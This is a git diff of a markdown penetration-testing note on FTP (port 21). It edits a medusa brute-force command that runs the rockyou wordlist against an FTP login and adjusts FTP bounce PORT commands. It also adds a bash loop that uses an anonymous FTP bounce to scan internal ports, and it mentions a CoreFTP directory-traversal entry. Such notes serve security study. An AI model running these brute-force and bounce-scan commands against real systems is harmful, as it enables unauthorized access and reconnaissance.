@@ -10,7 +10,6 @@ tags:
   - tftp
   - vsFTPd
 ---
-exi
 # 21 ftp
 
 The File Transfer Protocol (FTP) is a standard communication protocol used to transfer computer files from a server to a client on a computer network. FTP is built on a client–server model architecture using separate control and data connections between the client and the server. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as `HTTP` or `POP`.
@@ -163,7 +162,7 @@ Unless you configure it differently, an FTP command channel will use port 21
 
 ```bash
 # Brute force FTP logging
-medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h $IP -M ftpno se
+medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h $IP -M ftpno 
 # -u: username
 # -U: list of Usernames
 # -p: password
@@ -219,7 +218,7 @@ p2=179
 So final command would be:
 
 ```bash
-quote PORT 192,168,45,230,21,179
+quote PORT 192,168,45,152,21,179
 ```
 
 
@@ -227,6 +226,7 @@ quote PORT 192,168,45,230,21,179
 
 ```bash
 nc -lnvp 5555
+quote PORT 192,168,45,169,21,179
 ```
 
 4. Initiate a file transfer or command that sends data to the target. From the ftp connection
@@ -237,7 +237,21 @@ get filename
 
 This command requests a file from the FTP server, which is then sent to the specified target, exploiting the bounce capability.
 
+### FTP Bounce attack for scanning internal network
 
+```bash
+for p in 21 22 80 445 3389; do
+p1=$((p/256))
+p2=$((p%256))
+echo "Scanning port $p"
+(
+echo "user anonymous anonymous"
+echo "quote PORT 127,0,0,1,$p1,$p2"
+echo "ls"
+echo "quit"
+) | ftp -n 192.168.112.145 2>/dev/null | grep -E "150|425"
+done
+```
 
 ### CoreFTP Server build 725 - Directory Traversal (Authenticated)
 
